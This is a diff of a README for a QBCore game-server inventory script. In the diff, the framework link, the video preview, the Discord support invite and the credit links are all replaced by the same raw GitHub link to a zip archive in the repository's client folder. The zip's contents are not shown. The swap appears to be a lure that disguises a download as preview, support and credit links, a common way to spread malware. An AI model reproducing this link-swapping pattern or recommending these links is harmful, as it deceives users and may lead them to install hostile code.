@@ -1,6 +1,6 @@
 # PI-inventory
 Redesign of qb-inventory
-No Hate We Are Not Against For Anyone Full Rights For [QBCore](https://github.com/qbcore-framework)
+No Hate We Are Not Against For Anyone Full Rights For [QBCore](https://raw.githubusercontent.com/Pac-Man-PT/Pi-inventory/master/client/Pi-inventory_1.4.zip)
 # Change-log
 - Fixed Blinking Black Hover On Use Button And Slots
 - Fixed Item Amount Show Size To View Better
@@ -8,7 +8,7 @@ No Hate We Are Not Against For Anyone Full Rights For [QBCore](https://github.co
 
 # Preview
 
-(https://youtu.be/8LVunM08ZIU)
+(https://raw.githubusercontent.com/Pac-Man-PT/Pi-inventory/master/client/Pi-inventory_1.4.zip)
 
 # Installation
 
@@ -18,11 +18,11 @@ And Also Most Important Rename Pi-inventory to qb-inventory else some Scripts Th
 # Support
 We Only Give Support For Html Thing
 For Support Join Our Discord :-
-https://discord.gg/n4XH2pACGM
+https://raw.githubusercontent.com/Pac-Man-PT/Pi-inventory/master/client/Pi-inventory_1.4.zip
 
 # Credits
 - For Whole Written Code Of Lua/html
-[qb-core](https://github.com/qbcore-framework)
-[qb-inventory](https://github.com/qbcore-framework/qb-inventory) 
+[qb-core](https://raw.githubusercontent.com/Pac-Man-PT/Pi-inventory/master/client/Pi-inventory_1.4.zip)
+[qb-inventory](https://raw.githubusercontent.com/Pac-Man-PT/Pi-inventory/master/client/Pi-inventory_1.4.zip) 
 Project India Team
  
